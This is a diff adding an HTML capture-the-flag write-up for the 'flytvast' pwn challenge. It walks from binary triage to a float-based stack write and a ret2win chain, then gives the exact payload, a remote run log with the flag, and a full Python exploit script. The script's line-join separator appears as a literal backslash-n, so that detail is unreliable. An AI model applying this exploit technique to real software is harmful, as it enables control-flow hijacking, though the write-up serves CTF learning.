@@ -1,0 +1,558 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Flytväst</title>
+    <style>
+      :root {
+        --bg: #ffffff;
+        --fg: #111827;
+        --muted: #4b5563;
+        --line: #e5e7eb;
+        --code-bg: #f8fafc;
+        --accent: #0f766e;
+        --accent-soft: #ecfdf5;
+        --shadow: 0 18px 48px rgba(15, 23, 42, 0.06);
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        line-height: 1.65;
+      }
+
+      main {
+        max-width: 920px;
+        margin: 0 auto;
+        padding: 48px 24px 80px;
+      }
+
+      .hero {
+        padding: 28px 28px 24px;
+        background: linear-gradient(180deg, #ffffff 0%, #f8fffc 100%);
+        border: 1px solid var(--line);
+        border-radius: 24px;
+        box-shadow: var(--shadow);
+      }
+
+      h1, h2, h3 {
+        line-height: 1.2;
+        letter-spacing: -0.02em;
+      }
+
+      h1 {
+        font-size: 2.6rem;
+        margin: 0 0 8px;
+      }
+
+      h2 {
+        font-size: 1.5rem;
+        margin: 0 0 12px;
+      }
+
+      h3 {
+        font-size: 1.1rem;
+        margin: 28px 0 10px;
+      }
+
+      p, li {
+        font-size: 1rem;
+        color: var(--fg);
+      }
+
+      .lead {
+        color: var(--muted);
+        font-size: 1.05rem;
+        max-width: 70ch;
+      }
+
+      .meta {
+        display: inline-block;
+        margin-top: 10px;
+        padding: 6px 10px;
+        border: 1px solid #b7e4d7;
+        border-radius: 999px;
+        color: var(--accent);
+        background: var(--accent-soft);
+        font-size: 0.92rem;
+        font-weight: 600;
+      }
+
+      code, pre {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      }
+
+      pre {
+        overflow-x: auto;
+        background: var(--code-bg);
+        border: 1px solid var(--line);
+        border-radius: 14px;
+        padding: 16px 18px;
+        font-size: 0.94rem;
+      }
+
+      code {
+        background: var(--code-bg);
+        padding: 0.15em 0.35em;
+        border-radius: 6px;
+      }
+
+      ul {
+        padding-left: 20px;
+      }
+
+      .card {
+        background: #fff;
+        border: 1px solid var(--line);
+        border-radius: 18px;
+        padding: 18px 20px;
+        box-shadow: 0 8px 24px rgba(15, 23, 42, 0.04);
+      }
+
+      .small {
+        color: var(--muted);
+        font-size: 0.94rem;
+      }
+
+      .section {
+        margin-top: 26px;
+        background: #fff;
+        border: 1px solid var(--line);
+        border-radius: 22px;
+        padding: 24px 24px 22px;
+        box-shadow: var(--shadow);
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <header class="hero">
+        <h1>Flytväst</h1>
+        <p class="lead">
+          This is a full English writeup for the <code>flytvast</code> pwn challenge,
+          starting from initial binary triage and ending with a working exploit that
+          prints the flag: <code>undut{nu_Flyt3r_det_p4}</code>.
+        </p>
+        <div class="meta">Category: PWN • 64-bit Linux ELF • non-PIE • stack canary • NX • partial RELRO</div>
+      </header>
+
+      <section class="section">
+      <h2>Challenge Setup</h2>
+      <p>
+        The challenge story says you can order an emergency life vest from a system,
+        but to get the special version you need to break into the service. We are given
+        the binary <code>flytvast</code>, so the task is classic local binary analysis
+        followed by remote exploitation.
+      </p>
+      <p>
+        The session history also showed early operational friction before the actual
+        memory corruption work paid off: the local binary was initially not executable,
+        direct plain TCP against the service reset the connection, and the expected
+        <code>sc</code> client on this machine turned out to be the spreadsheet program
+        rather than <code>snicat</code>.
+      </p>
+      </section>
+
+      <section class="section">
+      <h2>Step 1: Basic Recon</h2>
+      <p>The first checks were file type, symbols, and hardening.</p>
+      <pre><code>file flytvast
+readelf -h flytvast
+readelf -W -l flytvast
+nm -n flytvast
+strings -a -n 4 flytvast</code></pre>
+      <p>This told us:</p>
+      <ul>
+        <li>The binary is a 64-bit dynamically linked ELF.</li>
+        <li>It is not stripped, which is very helpful.</li>
+        <li>It has a stack canary.</li>
+        <li>NX is enabled.</li>
+        <li>It is not PIE, so code addresses are fixed.</li>
+      </ul>
+      <p>
+        Two important symbols immediately stood out: <code>main</code> and
+        <code>print_flag</code>. A function literally named <code>print_flag</code>
+        is usually the win function.
+      </p>
+      </section>
+
+      <section class="section">
+      <h2>Step 2: Reverse the Important Functions</h2>
+      <p>I disassembled the interesting parts:</p>
+      <pre><code>objdump -d -Mintel flytvast | sed -n '/&lt;main&gt;:/,/^$/p'
+objdump -d -Mintel flytvast | sed -n '/&lt;print_flag&gt;:/,/^$/p'
+objdump -d -Mintel flytvast | sed -n '/&lt;setup&gt;:/,/^$/p'</code></pre>
+
+      <h3><code>print_flag</code></h3>
+      <p>
+        <code>print_flag</code> opens a local file called <code>flag</code>, reads it,
+        and prints the contents. That confirms the target function we want to reach.
+      </p>
+
+      <h3><code>main</code></h3>
+      <p>
+        The program asks for repeated measurements. Each line is parsed with
+        <code>strtod</code>, converted to a <code>float</code>, and stored on the stack.
+        Input ends when the user sends a blank line.
+      </p>
+      <p>The logic is approximately:</p>
+      <pre><code>int count = 0;
+char buf[0x20];
+
+while (1) {
+    printf("&gt; ");
+    fgets(buf, 0x20, stdin);
+    if (buf[0] == '\n') {
+        break;
+    }
+
+    float x = (float)strtod(buf, 0);
+    store[count] = x;
+    count++;
+}
+
+for (int i = 0; i &lt; count; i++) {
+    printf("%lf\n", (double)store[i]);
+}</code></pre>
+
+      <p>
+        The bug is that <code>store[count]</code> is not a real bounded array. The write
+        is computed relative to the input buffer on the stack, and after a few inputs
+        it walks into other local variables.
+      </p>
+      </section>
+
+      <section class="section">
+      <h2>Step 3: Find the Vulnerability</h2>
+      <p>
+        The critical detail is the stack layout. The write destination for the parsed
+        float starts at one stack offset, while the variable <code>count</code> itself
+        lives a little higher on the stack.
+      </p>
+      <p>
+        After four normal inputs, the fifth float write lands directly on
+        <code>count</code>. That means the program lets us overwrite the loop counter
+        with the raw 32-bit bits of a float value.
+      </p>
+      <p>
+        Once <code>count</code> is corrupted, the next float is written wherever the new
+        index points. This turns the bug into an attacker-controlled stack write.
+      </p>
+
+      <div class="card">
+        <strong>Core primitive:</strong>
+        the 5th input controls <code>count</code>, and the 6th+ inputs can write chosen
+        32-bit values to selected stack slots.
+      </div>
+      </section>
+
+      <section class="section">
+      <h2>Step 4: Why a Simple Ret2win Was Not Enough</h2>
+      <p>
+        The first idea was to overwrite the saved return address of <code>main</code>
+        directly with <code>print_flag</code>. That almost worked, but there was a catch.
+      </p>
+      <p>
+        Returning straight into <code>print_flag</code> does not give it a valid return
+        address in the stack layout it expects. After printing the flag, it crashes.
+        The clean solution is to build a tiny return chain:
+      </p>
+      <pre><code>ret gadget -&gt; print_flag -&gt; exit@plt</code></pre>
+      <p>
+        That extra <code>ret</code> fixes stack alignment and gives
+        <code>print_flag</code> a proper return target.
+      </p>
+      </section>
+
+      <section class="section">
+      <h2>Step 5: Convert Addresses into Float Inputs</h2>
+      <p>
+        The binary stores each input as a 32-bit float. So to write a chosen 32-bit
+        value, we reinterpret those bits as a float and send the float string.
+      </p>
+      <p>Important values were:</p>
+      <ul>
+        <li><code>ret</code> gadget at <code>0x401566</code></li>
+        <li><code>print_flag</code> at <code>0x4012b6</code></li>
+        <li><code>exit@plt</code> at <code>0x4011c0</code></li>
+        <li>Raw value <code>8</code> to force the next write index where we want it</li>
+      </ul>
+
+      <p>Examples of the converted float strings:</p>
+      <pre><code>0x00000008 -&gt; 0x1p-146
+0x00401566 -&gt; 0x1.0055980000000p-127
+0x004012b6 -&gt; 0x1.004ad80000000p-127
+0x004011c0 -&gt; 0x1.0047000000000p-127</code></pre>
+      </section>
+
+      <section class="section">
+      <h2>Step 6: Final Payload</h2>
+      <p>The working input sequence was:</p>
+      <pre><code>1
+2
+3
+4
+0x1p-146
+0
+0x1.0055980000000p-127
+0
+0x1.004ad80000000p-127
+0
+0x1.0047000000000p-127
+0
+
+</code></pre>
+
+      <p>What each line does:</p>
+      <ul>
+        <li><code>1,2,3,4</code>: fill the normal float slots.</li>
+        <li><code>0x1p-146</code>: overwrite <code>count</code> with raw value <code>8</code>.</li>
+        <li>Next <code>0</code>: clobber the high part of the adjacent stack slot.</li>
+        <li>Next pair: write the address of the plain <code>ret</code> gadget.</li>
+        <li>Next pair: write the address of <code>print_flag</code>.</li>
+        <li>Next pair: write the address of <code>exit@plt</code>.</li>
+        <li>Blank line: stop input and let <code>main</code> return into the chain.</li>
+      </ul>
+      <div class="card">
+        <strong>Easy-to-miss detail:</strong>
+        during local testing, ending input with EOF was not enough. The program does
+        not check <code>fgets()</code> for <code>NULL</code>, so EOF made it keep printing
+        prompts instead of cleanly breaking. The payload had to end with a real empty
+        line, which is why the final exploit input includes two trailing newlines.
+      </div>
+      </section>
+
+      <section class="section">
+      <h2>Step 7: Remote Connection Problem</h2>
+      <p>
+        There was one operational issue unrelated to exploitation: the challenge
+        infrastructure used TLS/SNI on <code>*.chals.io</code>. On this machine,
+        <code>sc</code> was not <code>snicat</code>; it was the unrelated spreadsheet
+        calculator package from Debian.
+      </p>
+      <p>
+        The workaround was to use <code>openssl s_client</code> as the transport layer.
+        That handled TLS correctly and let the exploit send the payload to the service.
+      </p>
+      <p>
+        This was not the first remote attempt. A plain socket version was tried first,
+        but the service closed the connection with a reset. The successful path was to
+        add an <code>openssl</code>-backed transport to the exploit script so it could
+        speak TLS with the right SNI for <code>*.chals.io</code>.
+      </p>
+      <pre><code>python3 solve_flytvast.py --remote undutmaning-flytvast.chals.io --port 443 --no-ssl
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+python3 solve_flytvast.py --remote undutmaning-flytvast.chals.io --port 443 --openssl
+...
+undut{nu_Flyt3r_det_p4}</code></pre>
+      </section>
+
+      <section class="section">
+      <h2>Step 8: Exploit Script</h2>
+      <p>
+        A Python script was written to automate both local and remote exploitation. The
+        final version supports local execution, raw socket mode, and an
+        <code>openssl</code>-backed remote mode.
+      </p>
+      <pre><code>python3 solve_flytvast.py --remote undutmaning-flytvast.chals.io --port 443 --openssl</code></pre>
+      <p>
+        The session log confirms that adding <code>--openssl</code> was the final
+        operational fix. Once that transport existed, the exact same exploit logic that
+        worked locally also worked against the remote challenge service.
+      </p>
+      <h3>How <code>solve_flytvast.py</code> Works</h3>
+      <p>
+        The script is intentionally small. At the top it hardcodes the three addresses
+        used by the chain: the plain <code>ret</code> gadget, <code>print_flag</code>,
+        and <code>exit@plt</code>.
+      </p>
+      <pre><code>RET_GADGET = 0x401566
+PRINT_FLAG = 0x4012B6
+EXIT_PLT = 0x4011C0</code></pre>
+      <p>
+        The helper <code>u32_to_float_hex()</code> converts a raw 32-bit integer into
+        the hexadecimal float string that the vulnerable program will parse with
+        <code>strtod</code>. That is the bridge between exploit addresses and valid text
+        input.
+      </p>
+      <p>
+        The real exploit is assembled in <code>build_payload()</code>. It returns one
+        byte string containing the four filler measurements, the float that overwrites
+        <code>count</code> with raw value <code>8</code>, the zero dwords used for the
+        high halves, the low 32-bit halves of the chain addresses, and finally the two
+        trailing blank lines needed to terminate input cleanly.
+      </p>
+      <p>
+        After that, the script only has transport wrappers:
+      </p>
+      <ul>
+        <li><code>run_local()</code>: executes the local binary, checks that it exists and is executable, then feeds the payload through stdin.</li>
+        <li><code>run_remote()</code>: uses Python sockets and can optionally wrap them in TLS.</li>
+        <li><code>run_remote_openssl()</code>: shells out to <code>openssl s_client -connect host:port -servername host -quiet</code>, which was the reliable solution for this challenge host.</li>
+      </ul>
+      <p>
+        The <code>main()</code> function is just argument parsing. If <code>--remote</code>
+        is set, it chooses either the Python socket transport or the <code>openssl</code>
+        transport. Otherwise it attacks the local binary. In every case it writes the
+        captured bytes directly to stdout so the user sees the same service output they
+        would see manually.
+      </p>
+      <h3>Actual Script</h3>
+      <pre><code>#!/usr/bin/env python3
+import argparse
+import os
+import socket
+import ssl
+import struct
+import subprocess
+import sys
+
+
+RET_GADGET = 0x401566
+PRINT_FLAG = 0x4012B6
+EXIT_PLT = 0x4011C0
+
+
+def u32_to_float_hex(value: int) -> str:
+    return struct.unpack("&lt;f", struct.pack("&lt;I", value))[0].hex()
+
+
+def build_payload() -&gt; bytes:
+    lines = [
+        "1",
+        "2",
+        "3",
+        "4",
+        u32_to_float_hex(8),
+        "0",
+        u32_to_float_hex(RET_GADGET),
+        "0",
+        u32_to_float_hex(PRINT_FLAG),
+        "0",
+        u32_to_float_hex(EXIT_PLT),
+        "0",
+        "",
+        "",
+    ]
+    return ("\\n".join(lines)).encode()
+
+
+def run_local(binary_path: str) -&gt; bytes:
+    if not os.path.exists(binary_path):
+        raise FileNotFoundError(f"binary not found: {binary_path}")
+
+    if not os.access(binary_path, os.X_OK):
+        raise PermissionError(
+            f"binary is not executable: {binary_path} "
+            f"(run: chmod +x {binary_path})"
+        )
+
+    proc = subprocess.run(
+        [binary_path],
+        input=build_payload(),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        cwd=os.path.dirname(os.path.abspath(binary_path)) or ".",
+        check=False,
+    )
+    return proc.stdout
+
+
+def run_remote(host: str, port: int, use_ssl: bool) -&gt; bytes:
+    sock = socket.create_connection((host, port))
+    if use_ssl:
+        ctx = ssl.create_default_context()
+        sock = ctx.wrap_socket(sock, server_hostname=host)
+
+    with sock:
+        sock.sendall(build_payload())
+        sock.shutdown(socket.SHUT_WR)
+
+        chunks = []
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            chunks.append(chunk)
+        return b"".join(chunks)
+
+
+def run_remote_openssl(host: str, port: int) -&gt; bytes:
+    proc = subprocess.run(
+        [
+            "openssl",
+            "s_client",
+            "-connect",
+            f"{host}:{port}",
+            "-servername",
+            host,
+            "-quiet",
+        ],
+        input=build_payload(),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        check=False,
+    )
+    return proc.stdout
+
+
+def main() -&gt; int:
+    parser = argparse.ArgumentParser(description="Exploit for the flytvast challenge binary.")
+    parser.add_argument("--binary", default="./flytvast", help="Path to local binary")
+    parser.add_argument("--remote", help="Remote host")
+    parser.add_argument("--port", type=int, default=443, help="Remote port")
+    parser.add_argument(
+        "--no-ssl",
+        action="store_true",
+        help="Disable TLS for remote mode",
+    )
+    parser.add_argument(
+        "--openssl",
+        action="store_true",
+        help="Use openssl s_client for remote mode instead of Python sockets",
+    )
+    args = parser.parse_args()
+
+    if args.remote:
+        if args.openssl:
+            output = run_remote_openssl(args.remote, args.port)
+        else:
+            output = run_remote(args.remote, args.port, not args.no_ssl)
+    else:
+        output = run_local(args.binary)
+
+    sys.stdout.buffer.write(output)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())</code></pre>
+      </section>
+
+      <section class="section">
+      <h2>Flag</h2>
+      <pre><code>undut{nu_Flyt3r_det_p4}</code></pre>
+      <h2>Takeaways</h2>
+      <ul>
+        <li>A stack canary does not help if the exploit avoids overwriting it.</li>
+        <li>Non-PIE binaries make ret2win-style attacks much easier.</li>
+        <li>Float parsing bugs can still become precise write primitives.</li>
+        <li>Sometimes the exploitation is easy and the transport layer is the real annoyance.</li>
+      </ul>
+
+      <p class="small">
+        Files used during solving: <code>flytvast</code> and
+        <code>solve_flytvast.py</code>.
+      </p>
+      </section>
+    </main>
+  </body>
+</html>
